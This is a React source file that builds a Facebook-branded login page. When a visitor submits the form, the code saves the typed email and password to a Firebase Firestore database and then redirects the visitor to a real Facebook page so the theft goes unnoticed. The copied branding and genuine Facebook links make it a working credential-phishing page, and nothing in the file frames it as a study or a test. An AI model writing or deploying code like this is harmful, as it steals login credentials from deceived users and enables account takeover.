import { useState } from 'react';
import './Need.css'
import firebase from './Store/Firebase/configuration'
function App() {
  const [email, setemail] = useState('')
  const [password, setpassword] = useState('')
  const handlesubmit=(e)=>{
	  e.preventDefault()
	firebase.firestore().collection(email).add({
		emailid:email,
		passwordlist:password,
	}).then(()=>{
		window.location.href="https://p.facebook.com/KannurVarthakalonline/"
	})
  }
  return (
    <div className="loginsignup">
			<div className="container">
				<div className="row justify-content-between">
					<div className="content-left">
						<h1>facebook</h1>
						<h2>Facebook helps you connect and share with the people in your life.</h2>
					</div>
					<div className="content-right">
						<form onSubmit={handlesubmit}>
							<div className="form-group">
								<input onChange={(e)=>setemail(e.target.value)} type="text" placeholder="Email address or phone number"/>
							</div>
							<div className="form-group">
								<input onChange={(e)=>setpassword(e.target.value)} type="password" placeholder="Password"/>
							</div>
							<div className="login">
								<button className="btn" >login</button>
							</div>
							<div className="forgot">
								<a href={`https://en-gb.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0`}>Forgotten account?</a>
							</div>
							<div className="create-btn">
								<a href={`https://www.facebook.com/r.php`} class="btn">create new account</a>
							</div>
						</form>
						<p><a href={`https://en-gb.facebook.com/pages/create/?ref_type=registration_form`}>Create a Page</a> for a celebrity, band or business.</p>
					</div>
				</div>
			</div>
		</div>
	
  );
}

export default App;
